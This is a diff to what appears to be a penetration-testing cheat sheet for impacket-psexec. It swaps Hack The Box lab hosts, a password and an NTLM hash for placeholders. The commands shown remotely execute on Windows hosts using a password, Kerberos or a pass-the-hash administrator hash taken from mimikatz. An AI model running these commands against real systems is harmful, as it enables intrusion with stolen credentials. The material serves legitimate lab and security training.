@@ -15,14 +15,15 @@ Requires:
 ## Capabilities
 
 ```bash
-# Authenticate with username/password
-impacket-psexec 'analysis.htb/Mojo:Password123!@10.129.189.54'
+# Authenticate with credentials
+impacket-psexec '$DOMAIN/username:password@$IP'
 
 # Authenticate with kerberos
-impacket-psexec support.htb/Administrator@dc.support.htb -k -no-pass
+impacket-psexec $DOMAIN/username@$IP -k -no-pass
 
 # Authenticate with hash
-impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+impacket-psexec -hashes :7a38... username@$IP
+impacket-psexec -hashes 00000000000000000000000000000000:7a38... username@$IP
 ```
 
 Note: In the hash example, we fill in the left side of the colon with zeros, and the right is the administrators NTLM hash pulled from `mimikatz`
